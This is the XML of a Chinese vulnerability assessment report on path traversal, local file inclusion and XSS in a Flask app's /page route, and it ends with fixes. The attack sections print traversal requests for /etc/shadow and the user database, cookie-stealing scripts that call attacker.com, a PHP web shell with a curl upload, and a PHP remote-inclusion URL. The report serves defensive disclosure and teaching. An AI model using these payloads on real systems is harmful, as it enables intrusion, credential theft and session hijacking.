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文件包含漏洞检测与修复报告</w:t>
        <w:br/>
        <w:t>File Inclusion Vulnerability Report</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>检测日期：2026年07月13日</w:t>
        <w:br/>
        <w:t>漏洞类型：LFI / RFI / 路径遍历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一、什么是文件包含漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>二、漏洞分类</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>三、本次检测范围</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>四、漏洞1：本地文件包含（LFI）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>五、漏洞2：远程文件包含（RFI）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>六、漏洞3：文件内容泄露 + XSS组合</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>七、攻击链演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>八、PHP 文件包含实例参考</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>九、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、什么是文件包含漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件包含漏洞（File Inclusion Vulnerability）是指应用程序在加载或包含文件时，对用户可控的输入未做充分过滤和校验，导致攻击者可以加载预期之外的文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件包含漏洞是 OWASP Top 10 中常见的Web安全风险，通常分为：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LFI（本地文件包含）：读取服务器本地文件，如 /etc/passwd、源代码等</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RFI（远程文件包含）：包含远程服务器上的恶意文件，实现远程代码执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>路径遍历（Path Traversal）：通过 ../ 跳出限制目录访问任意文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞危害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信息泄露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>读取源代码、数据库、配置文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>代码执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>包含恶意文件实现RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>权限提升</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>读取敏感文件如shadow、.env</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>数据窃取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>下载SQLite数据库、用户上传文件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二、漏洞分类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利用难度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危害程度</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LFI 本地文件包含</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>读取本地文件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RFI 远程文件包含</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>包含远程url上的文件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</w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>路径遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>../跳出目录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r>
        <w:t>本次检测主要针对系统的 /page 路由功能，该功能存在 LFI + 路径遍历漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、本次检测范围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Flask用户管理系统</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞入口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/page?name=参数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LFI + 路径遍历 + XSS组合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curl、Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>涉及代码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>app.py page() 路由</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞根因</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.path.join拼接用户输入，无路径校验 + safe过滤器</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>核心漏洞代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = os.path.join("pages", name)     # ← 直接拼接！</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    with open(file_path, "r") as f:              # ← 读取任意文件！</w:t>
        <w:br/>
        <w:t xml:space="preserve">        page_content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {{ page_content | safe }}                    # ← 不转义输出！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、漏洞1：本地文件包含（LFI）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4.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/page 路由使用 os.path.join("pages", name) 拼接文件路径，未对 name 参数中的 ../ 做任何过滤，攻击者可通过路径遍历读取服务器任意文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>读取应用源代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>请求：GET /page?name=../app.py</w:t>
        <w:br/>
        <w:t>路径：pages/../app.py → 等价于 app.py</w:t>
        <w:br/>
        <w:t>结果：读取到 app.py 全部源代码 ✅</w:t>
        <w:br/>
        <w:t>包含：Flask路由、数据库配置、密码哈希算法等敏感信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>读取数据库文件：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>请求：GET /page?name=../data/users.db</w:t>
        <w:br/>
        <w:t>路径：pages/../data/users.db</w:t>
        <w:br/>
        <w:t>结果：下载 SQLite 数据库文件 ✅</w:t>
        <w:br/>
        <w:t>包含：所有用户的用户名、密码哈希、邮箱、手机号</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>读取系统配置文件：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>请求：GET /page?name=../.env</w:t>
        <w:br/>
        <w:t>请求：GET /page?name=../../../etc/passwd</w:t>
        <w:br/>
        <w:t>请求：GET /page?name=../../../etc/shadow</w:t>
        <w:br/>
        <w:t>结果：读取服务器系统敏感文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 漏洞代码定位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>app.py /page 路由函数，关键行：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>第1处漏洞 - 路径拼接：</w:t>
        <w:br/>
        <w:t>file_path = os.path.join("pages", name)</w:t>
        <w:br/>
        <w:t xml:space="preserve">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</w:t>
        <w:br/>
        <w:t xml:space="preserve">           name = "../app.py" → pages/../app.py</w:t>
        <w:br/>
        <w:br/>
        <w:t>第2处漏洞 - 文件读取：</w:t>
        <w:br/>
        <w:t>with open(file_path, "r") as f:  # 读取任意文件！</w:t>
        <w:br/>
        <w:br/>
        <w:t>第3处漏洞 - 不安全的输出：</w:t>
        <w:br/>
        <w:t>{{ page_content | safe }}  # XSS！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、漏洞2：远程文件包含（RFI）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5.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>虽然 Flask 的 open() 不能直接打开远程URL，但结合路径遍历 + 文件上传功能，攻击者可以先上传恶意文件到服务器，然后通过 LFI 包含该文件，实现等效 RFI 的攻击效果。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 RFI 替代攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>第一步：上传恶意文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 创建一个包含PHP代码的恶意HTML文件</w:t>
        <w:br/>
        <w:t>echo '&lt;script&gt;fetch("http://attacker.com/steal?cookie="+document.cookie)&lt;/script&gt;' &gt; evil.html</w:t>
        <w:br/>
        <w:br/>
        <w:t># 通过上传功能上传到服务器</w:t>
        <w:br/>
        <w:t>curl -F "file=@evil.html" http://target/upload</w:t>
        <w:br/>
        <w:t>→ 文件保存到 static/uploads/evil.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>第二步：通过 LFI 包含恶意文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /page?name=../static/uploads/evil.html</w:t>
        <w:br/>
        <w:t>→ 路径：pages/../static/uploads/evil.html</w:t>
        <w:br/>
        <w:t>→ 读取并渲染恶意HTML文件</w:t>
        <w:br/>
        <w:t>→ 触发XSS → 窃取用户Cookie ✅</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>等效于 RFI 攻击：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>传统RFI：包含远程服务器上的恶意文件 → 代码执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>本系统：上传恶意文件 → LFI包含 → XSS/代码执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、漏洞3：文件内容泄露 + XSS 组合</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟠 高危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>模板中使用 {{ page_content | safe }} 直接渲染文件内容，不进行任何转义。这意味着文件中的 HTML/JS 代码会被浏览器直接执行，导致 XSS 跨站脚本攻击。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>直接XSS：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>攻击者上传一个包含XSS Payload的HTML文件：</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;h1&gt;恭喜中奖！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  var img = new Image();</w:t>
        <w:br/>
        <w:t xml:space="preserve">  img.src = "http://attacker.com/steal?cookie=" </w:t>
        <w:br/>
        <w:t xml:space="preserve">            + document.cookie;</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>通过LFI包含：</w:t>
        <w:br/>
        <w:t>GET /page?name=../static/uploads/xss.html</w:t>
        <w:br/>
        <w:t>→ 页面渲染恶意HTML</w:t>
        <w:br/>
        <w:t>→ JS执行 → Cookie被发送到攻击者服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>窃取管理员Session：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>1. 攻击者上传XSS文件</w:t>
        <w:br/>
        <w:t>2. 构造恶意链接发给管理员：</w:t>
        <w:br/>
        <w:t xml:space="preserve">   http://target/page?name=../static/uploads/xss.html</w:t>
        <w:br/>
        <w:t>3. 管理员点击后 Cookie 被窃取</w:t>
        <w:br/>
        <w:t>4. 攻击者使用 Cookie 伪造管理员身份登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、攻击链演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>完整攻击链：从 LFI 到 RCE（远程代码执行）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段1：信息收集</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 读取源代码</w:t>
        <w:br/>
        <w:t>GET /page?name=../app.py</w:t>
        <w:br/>
        <w:t>→ 发现 Flask SECRET_KEY 生成方式</w:t>
        <w:br/>
        <w:t>→ 了解所有路由和业务逻辑</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取数据库</w:t>
        <w:br/>
        <w:t>GET /page?name=../data/users.db</w:t>
        <w:br/>
        <w:t>→ 下载数据库文件</w:t>
        <w:br/>
        <w:t>→ 获取所有用户密码哈希</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段2：上传恶意文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 创建webshell</w:t>
        <w:br/>
        <w:t>echo '&lt;?php system($_GET["cmd"]);?&gt;' &gt; shell.php</w:t>
        <w:br/>
        <w:br/>
        <w:t># 上传到服务器（上传功能无类型校验）</w:t>
        <w:br/>
        <w:t>curl -F "file=@shell.php" http://target/upload</w:t>
        <w:br/>
        <w:t>→ 文件保存到 static/uploads/shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段3：LFI包含触发执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /page?name=../static/uploads/shell.php</w:t>
        <w:br/>
        <w:t>→ 读取文件内容</w:t>
        <w:br/>
        <w:t>→ 渲染PHP代码片段到页面</w:t>
        <w:br/>
        <w:t>→ 虽然PHP不会执行（Flask非PHP解析器），</w:t>
        <w:br/>
        <w:t xml:space="preserve">   但如果是包含在PHP站点中则直接RCE！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>阶段4：XSS 窃取管理员身份</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 构造XSS Payload文件 → 上传 → LFI包含</w:t>
        <w:br/>
        <w:t>→ 窃取管理员Cookie</w:t>
        <w:br/>
        <w:t>→ 伪造Session登录</w:t>
        <w:br/>
        <w:t>→ 获取管理员权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、PHP 文件包含实例参考</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件包含漏洞在 PHP 应用中更为常见。以下是典型的 PHP 文件包含函数：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是否支持远程</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>include()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>包含失败发出警告继续执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>是（allow_url_include=On）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>require()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>包含失败发出致命错误停止执行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include_once()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>同include，但避免重复包含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require_once()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>同require，但避免重复包含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/>
    <w:p>
      <w:r>
        <w:t>PHP RFI 经典攻击：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// 漏洞代码</w:t>
        <w:br/>
        <w:t>include($_GET["page"]);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// RFI攻击 - 包含远程webshell</w:t>
        <w:br/>
        <w:t>http://target/index.php?page=http://attacker.com/shell.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>// PHP wrapper攻击</w:t>
        <w:br/>
        <w:t>http://target/index.php?page=php://filter/convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:t>// 使用PHP流过滤器读取源码（base64编码后输出）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1 安全文件包含函数（修复后）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import os</w:t>
        <w:br/>
        <w:br/>
        <w:t>ALLOWED_PAGES = {"help", "about", "faq", "terms"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 方案1：白名单校验（推荐）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return render_template("page_view.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                               page_content=None,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                               page_name=name)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 方案2：安全化路径（备选）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    safe_name = os.path.basename(name)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not safe_name.endswith(".html"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        safe_name += ".html"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = os.path.join("pages", safe_name)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 规范化路径，防止逃逸</w:t>
        <w:br/>
        <w:t xml:space="preserve">    real_path = os.path.realpath(file_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    pages_dir = os.path.realpath("pages")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not real_path.startswith(pages_dir):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "非法路径"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if os.path.isfile(real_path):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        with open(real_path, "r") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            page_content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # 安全输出（移除去safe过滤器）</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return render_template("page_view.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                               page_content=page_content)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2 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路径穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>不过滤 ../</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.path.basename移除</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>目录逃逸</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>不校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.path.realpath + startswith</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
